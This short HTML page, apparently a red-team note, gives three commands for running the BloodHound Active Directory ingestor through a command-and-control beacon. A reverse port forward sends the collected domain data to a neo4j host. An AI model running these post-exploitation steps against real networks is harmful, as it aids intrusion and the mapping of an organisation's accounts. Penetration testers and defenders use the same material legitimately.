<title>Ingestion Through C2</title>
</head><body><ul><li>Import BloodHound.ps1 using: <b>powershell-import &lt;path-to-BloodHound.ps1&gt;</b></li>
<li>Set up a reverse port forward in beacon: <b>rportfwd 7474 &lt;neo4j host/ip&gt; 7474</b></li>
<li>Run the ingestor: <b>powershell Invoke-BloodHound -URI <a href="http://127.0.0.1:7474/">http://127.0.0.1:7474</a> -UserPass &quot;user:pass&quot;</b></li>
</ul>
</body></html>
